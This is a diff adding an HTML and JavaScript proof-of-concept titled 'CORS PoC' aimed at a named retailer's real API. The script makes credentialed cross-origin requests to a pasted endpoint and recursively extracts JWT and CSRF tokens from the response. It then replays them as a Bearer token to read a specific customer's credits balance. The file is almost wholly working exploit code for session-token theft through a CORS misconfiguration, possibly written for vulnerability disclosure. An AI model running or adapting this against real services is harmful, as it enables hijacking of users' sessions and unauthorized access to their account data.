@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html>
+<body>
+<h1>CORS PoC</h1>
+
+<p>
+  Paste a URL from DevTools that you expect returns a JWT in the response body:<br>
+  <input id="customUrl" type="text" style="width:600px"
+    placeholder="https://api.takealot.com/rest/v-1-16-0/..." />
+  <select id="customMethod">
+    <option>GET</option>
+    <option>POST</option>
+  </select>
+  <button onclick="runCustom()">Test it</button>
+</p>
+
+<h2>Response from custom URL</h2>
+<pre id="custom">—</pre>
+
+<h2>credits/balance Result</h2>
+<pre id="result">—</pre>
+
+<script>
+const BALANCE = "https://api.takealot.com/rest/v-1-16-0/customers/2678447/credits/balance";
+
+function extractJwt(obj) {
+  if (!obj || typeof obj !== "object") return null;
+  for (const key of Object.keys(obj)) {
+    if (["jwt", "token", "access_token", "tal_jwt", "id_token"].includes(key)) return obj[key];
+    const nested = extractJwt(obj[key]);
+    if (nested) return nested;
+  }
+  return null;
+}
+
+function extractCsrf(obj) {
+  if (!obj || typeof obj !== "object") return null;
+  for (const key of Object.keys(obj)) {
+    if (["csrf_token", "csrf", "csrfToken"].includes(key)) return obj[key];
+    const nested = extractCsrf(obj[key]);
+    if (nested) return nested;
+  }
+  return null;
+}
+
+async function runCustom() {
+  const url    = document.getElementById("customUrl").value.trim();
+  const method = document.getElementById("customMethod").value;
+  if (!url) return;
+
+  document.getElementById("custom").innerText  = "Loading...";
+  document.getElementById("result").innerText  = "—";
+
+  try {
+    const r    = await fetch(url, { method, credentials: "include", headers: { "Content-Type": "application/json" } });
+    const data = await r.json();
+    document.getElementById("custom").innerText = "Status: " + r.status + "\n\n" + JSON.stringify(data, null, 2);
+
+    const jwt  = extractJwt(data);
+    const csrf = extractCsrf(data);
+
+    if (!jwt) {
+      document.getElementById("result").innerText = "No JWT found in that response. Try a different endpoint.";
+      return;
+    }
+
+    const headers = { "Authorization": "Bearer " + jwt };
+    if (csrf) headers["X-CSRF-Token"] = csrf;
+
+    const balanceRes  = await fetch(BALANCE, { credentials: "include", headers });
+    const balanceData = await balanceRes.json();
+    document.getElementById("result").innerText =
+      "JWT extracted from response. Balance endpoint status: " + balanceRes.status
+      + "\n\n" + JSON.stringify(balanceData, null, 2);
+
+  } catch (e) {
+    document.getElementById("custom").innerText = "Error (likely CORS blocked on this endpoint): " + e;
+  }
+}
+</script>
+</body>
+</html>
